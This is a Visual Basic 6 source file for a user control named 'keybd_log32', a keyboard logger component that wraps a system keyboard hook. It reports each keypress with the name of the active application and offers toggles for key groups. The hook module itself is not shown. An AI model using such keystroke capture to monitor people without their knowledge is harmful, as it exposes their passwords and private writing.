VERSION 5.00
Begin VB.UserControl keybd_log32 
   ClientHeight    =   3600
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4800
   HasDC           =   0   'False
   InvisibleAtRuntime=   -1  'True
   ScaleHeight     =   3600
   ScaleWidth      =   4800
   Begin VB.Shape shp 
      Height          =   585
      Left            =   0
      Top             =   0
      Width           =   555
   End
   Begin VB.Image img 
      Height          =   720
      Left            =   0
      Picture         =   "keybd_log32.ctx":0000
      Top             =   0
      Width           =   720
   End
End
Attribute VB_Name = "keybd_log32"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = True
Option Explicit

Public Event KeyPressed(ByVal intKey As Integer, ByVal strKeyName As String, ByVal bIsFunctionKey As Boolean, ByVal strInApplication As String, ByVal bDiffersFromLastApp As Boolean)

Private WithEvents a As CCallback
Attribute a.VB_VarHelpID = -1
Private strLastApplication As String
Private blnFireShift As Boolean
Private blnFireCapital As Boolean
Private blnFireArrowKeys As Boolean
Private blnFireNumLock As Boolean
Private blnFireScrollLock As Boolean
Private blnFireControl As Boolean
Private blnFireAlt As Boolean
Private blnFireAltGr As Boolean
Private blnFireTab As Boolean
Private blnFireFKeys As Boolean
Private blnFireSpecialKeys As Boolean
Private blnFireWindowsKeys As Boolean

Private Sub a_KeyPressed(ByVal intKey As Integer, ByVal strKeyName As String, ByVal bIsFunctionKey As Boolean, ByVal strInApplication As String)
   If strInApplication = strLastApplication Then
      RaiseEvent KeyPressed(intKey, strKeyName, bIsFunctionKey, strInApplication, False)
      
   Else
      RaiseEvent KeyPressed(intKey, strKeyName, bIsFunctionKey, strInApplication, True)
      strLastApplication = strInApplication
   End If
End Sub

Public Property Let FireShift(ByVal b As Boolean)
Attribute FireShift.VB_Description = "Determines whether keyboardlogger will send {LShift} and {RShift} seperate from the concerning keys pressed together with shift."
   blnFireShift = b
   If Not a Is Nothing Then
      a.FireShift = b
   End If
End Property

Public Property Get FireShift() As Boolean
   FireShift = blnFireShift
End Property

Public Property Let FireCapital(ByVal b As Boolean)
Attribute FireCapital.VB_Description = "Enables/disables the callback for the capital key."
   blnFireCapital = b
   If Not a Is Nothing Then
      a.FireCapital = b
   End If
End Property

Public Property Get FireCapital() As Boolean
   FireCapital = blnFireCapital
End Property

Public Property Let FireArrowKeys(ByVal b As Boolean)
Attribute FireArrowKeys.VB_Description = "Enables/disables the callback for the arrow keys."
   blnFireArrowKeys = b
   If Not a Is Nothing Then
      a.FireArrowKeys = b
   End If
End Property

Public Property Get FireWindowsKeys() As Boolean
Attribute FireWindowsKeys.VB_Description = "Enables/disables the callback for the {WinLeft}, {WinRight}, {ContextMenu} keys."
   FireWindowsKeys = blnFireWindowsKeys
End Property

Public Property Let FireWindowsKeys(ByVal b As Boolean)
   blnFireWindowsKeys = b
   If Not a Is Nothing Then
      a.FireWindowsKeys = b
   End If
End Property

Public Property Get FireArrowKeys() As Boolean
   FireArrowKeys = blnFireArrowKeys
End Property

Public Property Let FireControl(ByVal b As Boolean)
Attribute FireControl.VB_Description = "Enables/disables the callback for the {RCtrl} and {LCtrl} keys."
   blnFireControl = b
   If Not a Is Nothing Then
      a.FireControl = b
   End If
End Property

Public Property Get FireControl() As Boolean
   FireControl = blnFireControl
End Property

Public Property Let FireTab(ByVal b As Boolean)
Attribute FireTab.VB_Description = "Enables/disables the callback for the {Tab} key."
   blnFireTab = b
   If Not a Is Nothing Then
      a.FireTab = b
   End If
End Property

Public Property Get FireTab() As Boolean
   FireTab = blnFireTab
End Property

Public Property Let FireFKeys(ByVal b As Boolean)
Attribute FireFKeys.VB_Description = "Enables/disables the callback for the {F1} to {F12} keys."
   blnFireFKeys = b
   If Not a Is Nothing Then
      a.FireFKeys = b
   End If
End Property

Public Property Get FireFKeys() As Boolean
   FireFKeys = blnFireFKeys
End Property

Public Property Let FireNumLock(ByVal b As Boolean)
Attribute FireNumLock.VB_Description = "Enables/disables the callback for the {NumLock} key."
   blnFireNumLock = b
   If Not a Is Nothing Then
      a.FireNumLock = b
   End If
End Property

Public Property Get FireNumLock() As Boolean
   FireNumLock = blnFireNumLock
End Property

Public Property Let FireScrollLock(ByVal b As Boolean)
Attribute FireScrollLock.VB_Description = "Enables/disables the callback for the {ScrollLock} key."
   blnFireScrollLock = b
   If Not a Is Nothing Then
      a.FireScrollLock = b
   End If
End Property

Public Property Get FireScrollLock() As Boolean
   FireScrollLock = blnFireScrollLock
End Property

Public Property Let FireSpecialKeys(ByVal b As Boolean)
Attribute FireSpecialKeys.VB_Description = "Enables/disables the callback for the {Esc}, {PgDown}, {PgUp}, {Insert}, {Delete}, {End}, {Home}, {Snapshot}, {Pause} keys."
   blnFireSpecialKeys = b
   If Not a Is Nothing Then
      a.FireSpecialKeys = b
   End If
End Property

Public Property Get FireSpecialKeys() As Boolean
   FireSpecialKeys = blnFireSpecialKeys
End Property

Public Property Let FireAlt(ByVal b As Boolean)
Attribute FireAlt.VB_Description = "Enables/disables the callback for the Alt key."
   blnFireAlt = b
   If Not a Is Nothing Then
      a.FireAlt = b
   End If
End Property

Public Property Get FireAlt() As Boolean
   FireAlt = blnFireAlt
End Property

Public Property Let FireAltGr(ByVal b As Boolean)
Attribute FireAltGr.VB_Description = "Enables/disables the callback for the AltGr key."
   blnFireAltGr = b
   If Not a Is Nothing Then
      a.FireAltGr = b
   End If
End Property

Public Property Get FireAltGr() As Boolean
   FireAltGr = blnFireAltGr
End Property

Private Sub UserControl_InitProperties()
   blnFireShift = True
   blnFireCapital = True
   blnFireArrowKeys = True
   blnFireNumLock = True
   blnFireScrollLock = True
   blnFireControl = True
   blnFireAlt = True
   blnFireAltGr = True
   blnFireFKeys = True
   blnFireTab = True
   blnFireSpecialKeys = True
   blnFireWindowsKeys = True
End Sub

Private Sub UserControl_ReadProperties(PropBag As PropertyBag)
   blnFireShift = PropBag.ReadProperty("FireShift", True)
   blnFireCapital = PropBag.ReadProperty("FireCapital", True)
   blnFireArrowKeys = PropBag.ReadProperty("FireArrowKeys", True)
   blnFireNumLock = PropBag.ReadProperty("FireNumLock", True)
   blnFireScrollLock = PropBag.ReadProperty("FireScrollLock", True)
   blnFireControl = PropBag.ReadProperty("FireControl", True)
   blnFireAlt = PropBag.ReadProperty("FireAlt", True)
   blnFireAltGr = PropBag.ReadProperty("FireAltGr", True)
   blnFireFKeys = PropBag.ReadProperty("FireFKeys", True)
   blnFireTab = PropBag.ReadProperty("FireTab", True)
   blnFireSpecialKeys = PropBag.ReadProperty("FireSpecialKeys", True)
   blnFireWindowsKeys = PropBag.ReadProperty("FireWindowsKeys", True)
   
   Set a = New CCallback
   
   a.FireShift = blnFireShift
   a.FireAlt = blnFireAlt
   a.FireAltGr = blnFireAltGr
   a.FireArrowKeys = blnFireArrowKeys
   a.FireCapital = blnFireCapital
   a.FireControl = blnFireControl
   a.FireFKeys = blnFireFKeys
   a.FireNumLock = blnFireNumLock
   a.FireScrollLock = blnFireScrollLock
   a.FireSpecialKeys = blnFireSpecialKeys
   a.FireTab = blnFireTab
   a.FireWindowsKeys = blnFireWindowsKeys
   
   Set KeyboardDispatcher.EventHandler = a
End Sub

Private Sub UserControl_Resize()
   With UserControl
      .Width = img.Width
      .Height = img.Height
   End With
   shp.Width = img.Width
   shp.Height = img.Height
End Sub

Public Sub EnableLogging()
   KeyboardDispatcher.DISPATCHER_START
End Sub

Public Sub DisabledLogging()
   If KeyboardDispatcher.bHooked Then
      KeyboardDispatcher.DISPATCHER_STOPP
   End If
End Sub

Private Sub UserControl_Terminate()
   If KeyboardDispatcher.bHooked Then
      KeyboardDispatcher.DISPATCHER_STOPP
   End If
End Sub

Private Sub UserControl_WriteProperties(PropBag As PropertyBag)
   PropBag.WriteProperty "FireShift", blnFireShift, True
   PropBag.WriteProperty "FireCapital", blnFireCapital, True
   PropBag.WriteProperty "FireArrowKeys", blnFireArrowKeys, True
   PropBag.WriteProperty "FireNumLock", blnFireNumLock, True
   PropBag.WriteProperty "FireScrollLock", blnFireScrollLock, True
   PropBag.WriteProperty "FireControl", blnFireControl, True
   PropBag.WriteProperty "FireAlt", blnFireAlt, True
   PropBag.WriteProperty "FireAltGr", blnFireAltGr, True
   PropBag.WriteProperty "FireFKeys", blnFireFKeys, True
   PropBag.WriteProperty "FireTab", blnFireTab, True
   PropBag.WriteProperty "FireSpecialKeys", blnFireSpecialKeys, True
   PropBag.WriteProperty "FireWindowsKeys", blnFireWindowsKeys, True
End Sub
